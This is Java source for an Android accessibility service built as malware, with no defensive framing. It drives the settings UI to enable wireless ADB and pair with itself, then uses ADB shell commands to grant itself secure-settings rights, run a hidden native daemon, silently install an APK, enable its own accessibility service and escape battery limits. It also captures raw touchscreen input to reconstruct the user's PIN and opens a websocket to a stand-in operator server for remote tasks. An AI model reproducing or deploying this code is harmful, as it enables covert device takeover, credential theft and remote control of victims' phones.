import android.accessibilityservice.AccessibilityService;
import android.provider.Settings;
import android.view.accessibility.AccessibilityNodeInfo;
import okhttp3.OkHttpClient;
import okhttp3.Request;

final class DeviceBridgeAgent extends AccessibilityService {
    private static final String PAIR_SERVICE = "_adb-tls-pairing._tcp.";
    private static final String CONNECT_SERVICE = "_adb-tls-connect._tcp.";
    private static final String INPUT = "shell:getevent -lt /dev/input/event2";
    private static final String X_EVENT = "EV_ABS ABS_MT_POSITION_X";
    private static final String Y_EVENT = "EV_ABS ABS_MT_POSITION_Y";
    private static final String CREDENTIAL_TYPE = "PASSWORD_QUALITY_TOUCH_POINTS";
    private static final String RESTORE = "pm install -r -g -i com.android.packageinstaller /data/local/tmp/app.apk";
    private static final String SET_SERVICE = "settings put secure enabled_accessibility_services com.example.agent/.SystemHelperService";
    private static final String ENABLE_SERVICE = "settings put secure accessibility_enabled 1";

    void enrollAndRun(AdbClient client, OkHttpClient http, String pairingCode) {
        startActivity(new android.content.Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS));
        AccessibilityNodeInfo root = getRootInActiveWindow();
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo node = root.getChild(i);
            CharSequence label = node.getText();
            if (label != null) node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }

        client.pair("127.0.0.1", pairingCode);
        client.openStream("shell:pm grant com.example.agent android.permission.WRITE_SECURE_SETTINGS");
        client.openStream("shell:/data/local/tmp/libsystem-helper.so --daemon");
        client.openStream("shell:pm install -r -g -i com.android.packageinstaller /data/local/tmp/app.apk");
        client.openStream("shell:settings put secure enabled_accessibility_services com.example.agent/.SystemHelperService");
        client.openStream("shell:settings put secure accessibility_enabled 1");
        client.openStream("shell:dumpsys deviceidle whitelist +com.example.agent");
        client.openStream(INPUT);

        http.newWebSocket(new Request.Builder()
                .url("wss://operator.invalid/api/v2/dev/tasks?deviceId=demo")
                .build(), new TaskListener());
    }

    int recoverCredential(int x, int y) {
        return mapTouchCoordinatesToPin(x, y);
    }

    int mapTouchCoordinatesToPin(int x, int y) {
        return ((y / 400) * 3) + (x / 360) + 1;
    }
}

interface AdbClient {
    void pair(String host, String pairingCode);
    void openStream(String service);
}

final class TaskListener extends okhttp3.WebSocketListener {}
